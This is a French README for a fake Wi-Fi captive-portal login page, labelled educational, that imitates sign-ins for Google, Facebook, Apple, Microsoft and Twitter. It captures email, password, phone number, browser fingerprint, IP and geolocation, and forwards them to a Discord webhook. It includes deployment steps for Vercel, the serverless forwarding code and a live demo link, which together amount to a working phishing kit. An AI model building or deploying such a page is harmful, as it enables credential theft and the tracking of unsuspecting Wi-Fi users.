# 🌐 Portail Wi-Fi – Démo Éducative

Ce projet est une **fausse page de connexion pour un portail Wi-Fi** à but **strictement pédagogique**.  
Il illustre comment collecter certaines données côté client (navigateur, IP, géolocalisation) et les transmettre à un webhook Discord.

> ⚠️ **Attention** : aucune authentification réelle n’est effectuée. Usage uniquement éducatif.

---

## ✨ Fonctionnalités principales

- Interface moderne, épurée et responsive adaptée à un portail Wi-Fi  
- Collecte côté client :  
  - Adresse e-mail, mot de passe (fictifs) et numéro de téléphone  
  - Informations navigateur (user-agent, langue, fuseau horaire, résolution écran…)  
  - IP publique et géolocalisation approximative via [ipapi.co](https://ipapi.co/json)  
- Simulation de connexion via plusieurs méthodes (Google, Facebook, Apple, Microsoft, Twitter)  
- Transmission sécurisée des données via un webhook Discord configuré en variable d’environnement  
- Déploiement simple et automatisé avec [Vercel](https://vercel.com)

---

## 🛠️ Technologies utilisées

- HTML, CSS et JavaScript natifs (sans framework)  
- API Web natives (`fetch`, `navigator`)  
- Service tiers [ipapi.co](https://ipapi.co/json) pour récupération IP/géolocalisation  
- Backend minimal via API Serverless sur Vercel pour sécuriser le webhook

---

## 🚀 Déploiement sur Vercel

### 1. Cloner ce dépôt

```bash
git clone https://github.com/PariaHRZ/gcloud-login.git
cd gcloud-login
````

### 2. Déployer sur Vercel

* Connecte-toi sur [vercel.com](https://vercel.com)
* Connecte ton compte GitHub et importe ce projet
* Dans la section **Environment Variables**, ajoute la variable suivante :

| Nom                   | Valeur (exemple)                            |
| --------------------- | ------------------------------------------- |
| `DISCORD_WEBHOOK_URL` | `https://discord.com/api/webhooks/xxxxxxxx` |

* Lancer le déploiement
* L’application sera accessible via une URL du type :
  `https://ton-projet.vercel.app`

---

## 📦 Exécution locale

```bash
git clone https://github.com/PariaHRZ/gcloud-login.git
cd gcloud-login
open index.html  # ou double-clique simplement sur le fichier
```

> ⚠️ Le webhook Discord ne fonctionnera pas en local sans backend.

---

## 🔒 Sécurité du webhook

Le webhook Discord est **stocké uniquement dans une variable d’environnement côté serveur** (`DISCORD_WEBHOOK_URL`).
Il **n’apparaît jamais dans le code client**, ce qui évite toute fuite d’information.

L’envoi des données est fait via une fonction API Vercel serverless sécurisée.

---

## 📁 Exemple de fonction API (fichier `/api/webhook.js`)

```js
export default async function handler(req, res) {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) return res.status(500).send("Webhook manquant");

  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(req.body),
  });

  res.status(200).send("OK");
}
```

### Côté client (JS)

```js
fetch("/api/webhook", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ content: message })
});
```

---

## 📄 Licence

Ce projet est sous licence [MIT](https://github.com/PariaHRZ/gcloud-login/blob/main/LICENSE), libre d’adaptation pour usage pédagogique uniquement.

---

## 🔗 Démo en ligne

[https://gcloud-login-git-main-pariahrzs-projects.vercel.app/](https://gcloud-login-git-main-pariahrzs-projects.vercel.app/)

---

<img src="https://github.com/user-attachments/assets/632e655f-7d6c-43ad-b329-03e0f32c0be0" alt="Capture d'écran portail Wi-Fi" width="450" />
```
